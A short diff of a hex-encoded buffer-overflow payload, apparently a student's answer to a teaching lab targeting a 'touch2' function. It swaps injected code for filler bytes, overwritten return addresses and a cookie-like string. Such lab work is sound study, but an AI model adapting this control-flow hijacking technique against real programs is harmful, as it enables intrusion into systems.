@@ -1,9 +1,12 @@
-48 8d 3c 24                /* mov the first address of string to %rdi */
-48 83 ec 08                /* sub $0x08,%rsp */
-67 c7 04 24 fa 18 40 00    /* movl $0x4018fa, (%esp) */
+ff ff ff ff ff ff ff ff    /* junk */
+ff ff ff ff ff ff ff ff    /* junk */
+ff ff ff ff ff ff ff ff    /* junk */
+ff ff ff ff ff ff ff ff    /* junk */
+ff ff ff ff ff ff ff ff    /* junk */
+b8 dc 61 55 00 00 00 00    /* address of pop instruction */
+c0 dc 61 55 00 00 00 00    /* first address of string */
+fa 18 40 00 00 00 00 00    /* address of touch2 */
+5f                         /* pop %rdi */
 c3                         /* ret */
-00 00 00 00 00 00 00 00    /* padding */
-00 00 00 00 00 00 00 
-00 00 00 00 00 00 00 00
-78 dc 61 55 00 00 00 00    /* address of movl instruction */
+00 00 00 00 00 00          /* padding */
 35 39 62 39 39 37 66 61 00 /* string */
